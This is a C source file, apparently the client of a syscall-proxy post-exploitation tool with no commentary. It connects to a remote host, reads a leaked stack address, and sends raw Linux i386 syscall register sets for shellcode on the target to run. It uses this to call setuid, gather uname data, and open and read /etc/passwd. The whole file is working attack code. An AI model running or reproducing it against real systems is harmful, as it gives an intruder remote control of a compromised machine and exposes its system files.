#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/stat.h>

struct reg {
   long eax;
   long ebx;
   long ecx;
   long edx;
   long esi;
   long edi;
};

long esp;

int s_setuid(int sockfd, int uid);
int s_getuid(int sockfd);
int s_uname(int sockfd, struct utsname *buf);
int s_open(int sockfd, const char *pathname, int flags, int mode);
int s_read(int sockfd, int fd, void *buf, int len);
int s_write(int sockfd, int fd, void *ibuf, int buflen);

void hexdump(char *desc, unsigned char *data, unsigned int amount);

int
main(int argc, char **argv)
{
   char buf[2048];
   int sockfd, len, fd, n;
   struct sockaddr_in sin;
   struct utsname un;

   memset(buf, 0, sizeof(buf));
   
   if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      perror("socket()");
      exit(-1);
   }

   sin.sin_port = htons(atoi(argv[2]));
   sin.sin_family = AF_INET;
   sin.sin_addr.s_addr = inet_addr(argv[1]);

   if(connect(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
      perror("connect()");
      exit(-1);
   }

   read(sockfd, &esp, 4);

   printf("esp = %p\n\n", esp);

   s_setuid(sockfd, 666);
   s_getuid(sockfd);
   s_uname(sockfd, &un);

   printf("\nuname information:\n"
         "  sysname:\t%s\n"
         "  nodename:\t%s\n"
         "  release:\t%s\n"
         "  version:\t%s\n"
         "  machine:\t%s\n\n", un.sysname, un.nodename, un.release, un.version, un.machine);

   fd = s_open(sockfd, "/etc/passwd", O_RDONLY, 0);
   if(fd < 0) {
      printf("s_open failed\n");
      return(-1);
   }

   s_read(sockfd, fd, &buf, 2048);

   printf("\nread() results:\n\n%s", buf);
}

int s_read(int sockfd, int fd, void *ibuf, int buflen)
{
   int n, len;
   char *buf;
   struct reg reg;

   printf("DEBUG: s_read(%d, %p, %d)\n", fd, ibuf, buflen);
   
   len = buflen + sizeof(reg);
   buf = malloc(len + 1);

   memset(buf, 0, sizeof(buf));
   memset(&reg, 0, sizeof(reg));
   
   reg.eax = 3;
   reg.ebx = fd;
   reg.ecx = esp - len + (32 + sizeof(reg));
   reg.edx = buflen;

   write(sockfd, &len, sizeof(len));

   memcpy(buf, &reg, sizeof(reg));
   write(sockfd, buf, len);

   memset(buf, 0, len + 1);
   n = read(sockfd, buf, len);

   memcpy(&reg, buf, sizeof(reg));
   memcpy(ibuf, buf + sizeof(reg), buflen);
  
   return(reg.eax);
}

int s_write(int sockfd, int fd, void *ibuf, int buflen)
{
   int n, len;
   char *buf;
   struct reg reg;

   printf("DEBUG: s_write(%d, %p, %d)\n", fd, ibuf, buflen);
   
   len = buflen + sizeof(reg);
   buf = malloc(len + 1);

   memset(buf, 0, sizeof(buf));
   memset(&reg, 0, sizeof(reg));
   
   reg.eax = 4;
   reg.ebx = fd;
   reg.ecx = esp - len + (32 + sizeof(reg));
   reg.edx = buflen;

   write(sockfd, &len, sizeof(len));

   memcpy(buf, &reg, sizeof(reg));
   memcpy(buf + sizeof(reg), ibuf, buflen);
   write(sockfd, buf, len);

   memset(buf, 0, len + 1);
   n = read(sockfd, buf, len);

   memcpy(&reg, buf, sizeof(reg));
//   memcpy(ibuf, buf + sizeof(reg), buflen);
  
   return(reg.eax);
}

int s_open(int sockfd, const char *pathname, int flags, int mode)
{
   int len;
   char *buf;
   struct reg reg;
   
   printf("DEBUG: s_open(%s, %d)\n", pathname, flags);
   
   len = strlen(pathname) + sizeof(reg) + 1;
   buf = malloc(len + 1);

   memset(&reg, 0, sizeof(reg));
   memset(buf, 0, len + 1);

   reg.eax = 5;
   reg.ebx = esp - len + (32 + sizeof(reg));
   reg.ecx = flags;
   reg.edx = mode;

   write(sockfd, &len, sizeof(len));

   memcpy(buf, &reg, sizeof(reg));
   memcpy(buf + sizeof(reg), pathname, strlen(pathname));

   write(sockfd, buf, len);

   memset(buf, 0, len + 1);
   read(sockfd, buf, len);
   memcpy(&reg, buf, sizeof(reg));

   return(reg.eax);
}

int s_uname(int sockfd, struct utsname *un)
{
   int len, n;
   char *buf;
   struct reg reg;
   
   printf("DEBUG: s_uname(%p)\n", un);

   len = sizeof(struct utsname) + sizeof(reg) + 1;
   buf = malloc(len + 1);

   memset(&reg, 0, sizeof(reg));
   memset(buf, 0, len + 1);

   reg.eax = 122;
   reg.ebx = esp - len + (32 + sizeof(reg));

   write(sockfd, &len, sizeof(len));

   memcpy(buf, &reg, sizeof(reg));
   write(sockfd, buf, len);

   memset(buf, 0, len + 1);
   n = read(sockfd, buf, len);

   memcpy(&reg, buf, sizeof(reg));
   memcpy(un, buf + sizeof(reg), sizeof(struct utsname));

   return(reg.eax);
}

int
s_setuid(int sockfd, int uid)
{
   int len;
   struct reg reg;

   printf("DEBUG: s_setuid(%d)\n", uid);
   
   memset(&reg, 0, sizeof(reg));
   
   reg.eax = 23;
   reg.ebx = uid;

   len = sizeof(reg);

   write(sockfd, &len, sizeof(len));
   write(sockfd, &reg, len);

   memset(&reg, 0, sizeof(reg));

   read(sockfd, &reg, sizeof(reg));

   return(reg.eax);
}

int
s_getuid(int sockfd)
{
   int len;
   struct reg reg;
   
   printf("DEBUG: s_getuid()\n");

   memset(&reg, 0, sizeof(reg));

   reg.eax = 24;
   
   len = sizeof(reg);

   write(sockfd, &len, sizeof(len));
   write(sockfd, &reg, sizeof(reg));

   memset(&reg, 0, sizeof(reg));

   read(sockfd, &reg, sizeof(reg));

   return(reg.eax);
}

void
hexdump(char *desc, unsigned char *data, unsigned int amount)
{
   unsigned int dp, p;  /* data pointer */
   const char trans[] =
   "................................ !\"#$%&'()*+,-./0123456789"
   ":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
   "nopqrstuvwxyz{|}~...................................."
   "....................................................."
   "........................................";


   for (dp = 1; dp <= amount; dp++) {
      fprintf(stderr, "%02x ", data[dp - 1]);
      if ((dp % 8) == 0)
         fprintf(stderr, " ");
      if ((dp % 16) == 0) {
         fprintf(stderr, "| ");
         p = dp;
         for (dp -= 16; dp < p; dp++)
            fprintf(stderr, "%c", trans[data[dp]]);
         fflush(stderr);
         fprintf(stderr, "\n");
      }
      fflush(stderr);
   }
   if ((amount % 16) != 0) {
      p = dp = 16 - (amount % 16);
      for (dp = p; dp > 0; dp--) {
         fprintf(stderr, "   ");
         if (((dp % 8) == 0) && (p != 8))
            fprintf(stderr, " ");
         fflush(stderr);
      }
      fprintf(stderr, " | ");
      for (dp = (amount - (16 - p)); dp < amount; dp++)
         fprintf(stderr, "%c", trans[data[dp]]);
      fflush(stderr);
   }
   fprintf(stderr, "\n");

   return;
}
